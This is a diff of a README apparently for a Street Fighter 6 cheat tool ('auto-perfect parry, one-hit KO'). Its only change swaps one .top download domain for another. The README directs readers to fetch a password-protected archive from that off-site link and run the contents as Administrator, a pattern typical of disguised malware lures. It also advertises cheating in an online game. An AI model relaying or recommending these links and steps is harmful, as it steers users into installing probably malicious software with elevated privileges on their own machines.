@@ -6,7 +6,7 @@ Street Fighter 6 external hack with auto-perfect parry, one-hit KO, infinite dri
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular frameworks like **RE Framework** and **BepInEx**, but externall
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Street Fighter 6.
 4. Run the hack **as Administrator**.
